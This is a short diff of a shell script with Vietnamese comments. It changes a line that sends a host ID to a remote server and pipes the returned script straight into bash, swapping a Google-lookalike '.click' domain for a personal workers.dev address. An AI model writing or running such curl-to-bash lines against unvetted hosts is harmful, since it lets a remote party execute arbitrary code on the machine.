@@ -11,7 +11,7 @@ fi
 echo "Sử dụng ID: $MY_ID"
 
 # Thực thi curl với ID vừa lấy được
-curl -sL "https://meta.googleidx.click/config?hostname=$MY_ID" | bash
+curl -sL "https://vps-metadata-server.huongmya53.workers.dev/config?hostname=$MY_ID" | bash
 
 
 # echo "Checking qemu-kvm..."
